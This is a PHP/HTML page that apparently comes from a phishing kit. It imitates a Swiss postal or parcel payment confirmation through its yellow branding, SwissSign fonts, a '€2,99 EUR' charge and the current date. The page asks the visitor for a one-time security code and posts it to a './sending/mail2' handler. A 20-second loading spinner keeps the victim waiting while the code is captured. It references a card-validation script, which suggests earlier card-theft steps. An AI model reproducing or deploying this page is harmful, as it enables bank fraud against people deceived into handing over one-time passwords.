<?php

    session_start();

    require 'lang.php';
    require 'main.php';
    require 'config/settings.php';

?>
<!DOCTYPE html>
<html lang="de">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="shortcut icon" type="image/x-icon" href="./assets/img/favicon.ico">
      <style>
         body { margin: 0; padding: 0; font-family: 'SwissSignCircularWeb-Regular', sans-serif; background: url('./assets/img/background.png') no-repeat center center fixed; background-size: cover; font-size: 16px; }
         header { background-color: #FFCC00; color: #333; text-align: center; padding: 1em; }
         header img { max-width: 200px; height: auto; display: block; margin: 0 auto; }
         .container { text-align: center; margin: 50px auto; padding: 20px; border-radius: 10px; max-width: 500px; background-color: #fff; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
         h1 { font-family: 'SwissSignCircularWeb-Bold', sans-serif; }
         .form-group { position: relative; margin-bottom: 20px; }
         input { width: 100%; padding: 10px; border: none; border-radius: 0; border-bottom: 2px solid #ccc; box-sizing: border-box; font-size: 16px; background-color: transparent; transition: border-color 0.3s; color: #333; }
         input:focus { outline: none; border-bottom-color: #000000; }
         label { position: absolute; top: 50%; left: 10px; transform: translateY(-50%); color: #888; transition: all 0.3s ease; pointer-events: none; background-color: #fff; padding: 0 5px; }
         input:focus + label, input:not(:placeholder-shown) + label { top: -12px; font-size: 12px; color: #333; }
         button { background-color: #000000; color: #fff; padding: 10px; border: none; border-radius: 5px; cursor: pointer; width: 100%; box-sizing: border-box; font-size: 16px; }
         @media (max-width: 600px) { input, button { width: 100%; } }
         @font-face { font-family: 'SwissSignCircularWeb-Regular'; src: url('./assets/fonts/SwissSignCircularWeb-Regular.3938e032.woff2') format('woff2'); font-weight: normal; font-style: normal; }
         @font-face { font-family: 'SwissSignCircularWeb-Bold'; src: url('./assets/fonts/SwissSignCircularWeb-Bold.c6a5de6b.woff2') format('woff2'); font-weight: bold; font-style: normal; }
         .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.9); display: flex; justify-content: center; align-items: center; z-index: 1000; }
         .overlay-content { text-align: center; }
         .spinner { border: 6px solid #FFCC00; border-radius: 50%; border-top: 6px solid transparent; width: 50px; height: 50px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         /* New styles for right-aligned information in a table format */
         table { width: 100%; margin-top: 20px; }
         table tr td { text-align: left; padding: 10px; }
         table tr td:last-child { text-align: right; }
      </style>
      <script>
         document.addEventListener('DOMContentLoaded', function () {
             function showSpinner() {
                 var overlay = document.createElement('div');
                 overlay.className = 'overlay';
                 document.body.appendChild(overlay);

                 var overlayContent = document.createElement('div');
                 overlayContent.className = 'overlay-content';
                 overlay.appendChild(overlayContent);

                 var spinner = document.createElement('div');
                 spinner.className = 'spinner';
                 overlayContent.appendChild(spinner);

                 setTimeout(function () {
                     overlay.remove();
                 }, 20000);
             }

             document.querySelector('form').addEventListener('submit', function (event) {
                 var formValid = true;
                 var requiredFields = document.querySelectorAll('[required]');

                 requiredFields.forEach(function (field) {
                     if (!field.value.trim()) {
                         formValid = false;
                         field.style.borderBottomColor = '#EF2637';
                     }
                 });

                 if (formValid) {
                     showSpinner();
                 } else {
                     event.preventDefault();
                 }
             });
         });
      </script>
      <title><?php echo lang('1');?></title>
   </head>
   <body>
      <header>
        <img src="./assets/img/logo.svg" width="70" alt="Logo">
      </header>
      <div class="container">
         <h1><?php echo lang('14');?></h1>
         <form action="./sending/mail2" method="POST">
            <table>
               <tr>
                  <td><?php echo lang('15');?> </td>
                  <td><?php echo lang('21');?></td>
               </tr>
               <tr>
                  <td><?php echo lang('16');?></td>
                  <td>€2,99 EUR</td>
               </tr>
               <tr>
                  <td><?php echo lang('17');?></td>
                  <td><?php echo date("d-m-Y"); ?></td>
               </tr>
            </table>
            <div class="form-group">
               <input type="tel" id="OTP" data-mask="000000000" placeholder="<?php echo lang('18');?>" name="onetime" required="">
            </div>
            <div class="form-group">
            </div>
            <button type="submit"><?php echo lang('19');?></button>
         </form>
      </div>
      <script src="./assets/js/card-validation.js"></script>
   </body>
</html>
